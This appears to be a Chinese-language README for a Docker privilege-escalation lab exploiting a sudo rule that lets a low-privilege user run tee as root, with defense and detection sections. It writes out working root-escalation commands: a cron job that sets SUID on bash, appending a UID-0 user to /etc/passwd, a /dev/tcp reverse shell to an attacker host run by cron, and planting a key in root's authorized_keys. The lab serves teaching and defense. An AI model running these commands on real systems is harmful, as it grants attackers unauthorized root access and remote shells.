# sudo tee 任意文件写提权（组合拳）

## 快速使用（一键利用）

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/sudo-tee-write
docker compose up -d --build
docker exec -it sudo-tee-write su - lowpriv   # 密码 lowpriv123
```

### 第二步：容器内确认漏洞环境

```bash
id
sudo -l
# 预期: (root) NOPASSWD: /usr/bin/tee
ls -la /opt/exploits/
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 原理

管理员授权了 `lowpriv ALL=(root) NOPASSWD: /usr/bin/tee`——tee 可以**以 root 身份
向任意文件写入内容**，但 tee 本身不能直接弹 shell。这就是"有 root 写入、无 shell"
的经典场景，必须打**组合拳**：

```
sudo tee (root 写任意文件)
  ├─ 拳法1: 写 /etc/cron.d/ 计划任务 -> cron 定时提权
  ├─ 拳法2: 追加 /etc/passwd -> 新增 UID=0 用户 -> su
  └─ 拳法3: 写反弹脚本 + cron 定时执行 -> nc 反弹 root shell
```

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：/etc/sudoers.d/lowpriv 中 `lowpriv ALL=(root) NOPASSWD: /usr/bin/tee`

## 手动利用（分步教学）

### 拳法 1：写计划任务提权（最稳，无人值守）

```bash
# 1. 用 sudo tee 写入 root 的 cron 任务 (cron.d 格式必须带 user 字段)
echo '* * * * * root chmod u+s /bin/bash' | sudo tee /etc/cron.d/pwn

# 2. 验证写入
cat /etc/cron.d/pwn

# 3. 等待 1 分钟, cron 以 root 执行
sleep 65
ls -l /bin/bash          # -rwsr-xr-x  出现 s 位
/bin/bash -p -c 'id'     # euid=0(root) 提权成功
```

原理：tee 以 root 写 /etc/cron.d/pwn；cron 每分钟读取该目录并执行 root 任务；
`chmod u+s /bin/bash` 由 root 执行，bash 获得 SUID。

### 拳法 2：写 /etc/passwd 加 root 用户（本地秒提）

```bash
# 1. 生成密码哈希 (明文 123456)
openssl passwd -1 -salt hacker 123456
# 输出: $1$hacker$6luIRwdGpBvXdP.GMwcZp/

# 2. 用 sudo tee 追加 UID=0 用户
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd

# 3. 登录
su hacker        # 密码 123456
id               # uid=0(root) 提权成功
```

### 拳法 3：写反弹 shell（远程提权）

```bash
# 1. 攻击机监听
#    nc -lvnp 4444

# 2. 用 sudo tee 写反弹脚本
echo '#!/bin/bash
bash -i >& /dev/tcp/攻击机IP/4444 0>&1' | sudo tee /usr/local/bin/shell.sh

# 3. 用 sudo tee 写 cron 任务定时执行它
echo '* * * * * root /bin/bash /usr/local/bin/shell.sh' | sudo tee /etc/cron.d/rev

# 4. 等 1 分钟, 攻击机收到 root 反弹 shell
```

## 为什么能成功

| 环节 | 说明 |
|:---|:---|
| sudo tee | tee 以 euid=0 运行，写入目标文件不检查调用者权限 |
| 写 cron.d | cron 以 root 读取执行 /etc/cron.d/* 任务，含 user 字段 |
| 写 passwd | PAM 兼容回退：passwd 内嵌哈希直接用于认证，UID=0 即 root |
| 无 shell 限制 | 组合拳把"写文件"升级为"执行代码" |

## 防御

- 不授权 tee 类"任意写"命令的 sudo（tee 在 GTFOBins 危险清单）
- 如需授权，限定参数（如 `sudo tee /var/log/xxx.log`）且禁止 `-a` 到系统文件
- 监控 /etc/cron.d、/etc/passwd 变更（auditd）

## 扩展教学（网络搜索整理）

### GTFOBins 定位

tee 在 GTFOBins 中的分类是 file-write——配合任意可写目标即可提权。
sudo 危险授权里 tee 出现频率不低（管理员用它"方便地写日志"）。

### 同类"无 shell 写文件"命令清单

| 命令 | 能力 | 组合目标 |
|:---|:---|:---|
| tee | 写/追加任意文件 | cron.d / passwd / authorized_keys |
| cp | 覆盖任意文件 | cron 脚本 / passwd / sudoers |
| dd | 写/追加任意文件 | cron.d / passwd |
| openssl | 读任意文件 | shadow -> john 破解 |
| install | 安装(写)文件 | 同上 |

### 更隐蔽的变体：写 SSH 密钥

```bash
# 如果 root 的 .ssh 存在且允许登录
echo 'ssh-rsa AAAA...' | sudo tee /root/.ssh/authorized_keys
# 攻击机免密登录 root
ssh -i id_rsa root@目标IP
```

### 检测

```bash
sudo grep -RniE 'tee|cp|dd' /etc/sudoers /etc/sudoers.d/
# 监控计划任务目录
auditctl -w /etc/cron.d -p wa -k cron_write
```

## 验证记录

2026-08-26 实机验证（Kali 2026.2 / Docker 29.7.2）：`echo '* * * * * root chmod u+s /bin/bash' | sudo tee /etc/cron.d/pwn` 写入后等待 65 秒，`/bin/bash -p -c 'id'` 输出 `uid=1000(lowpriv) ... euid=0(root)`，复现成功。
